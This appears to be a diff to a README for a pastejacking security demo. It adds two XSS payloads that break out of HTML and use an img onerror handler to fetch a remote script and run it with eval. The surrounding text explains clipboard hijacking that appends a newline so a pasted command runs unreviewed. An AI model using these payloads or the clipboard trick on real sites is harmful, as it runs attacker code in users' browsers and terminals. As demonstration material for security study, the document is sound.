@@ -20,6 +20,24 @@ Will be replaced with
 echo "evil"\r\n
 ```
 
+## shiky8  xss Demo
+
+alert payload 
+
+```js
+s </p>
+<img src="http://127.0.0.1/xss.js" onerror="fetch('http://127.0.0.1/xss.js').then(response => response.text()).then(eval)">
+<p>
+```
+
+Pastejacking payload 
+
+```js
+s2 </p>
+<img src="http://127.0.0.1/xss.js" onerror="fetch('http://127.0.0.1/xss2.js').then(response => response.text()).then(eval)">
+<p>
+```
+
 Note the newline character gets appended to the end of the line. When a user goes to paste the echo command into their terminal, "evil" will automatically get echoed to the screen without giving the user a chance to review the command before it executes. 
 
 [This demo](https://security.love/Pastejacking/index1.html) hooks into the keydown event, so if a user uses keyboard shortcuts, i.e. ctrl+c or command+c, an 800ms timer gets set that will override the user's clipboard with malicious code. This demo works in Chrome, Firefox, and Internet Explorer, but is not compatable with Safari.
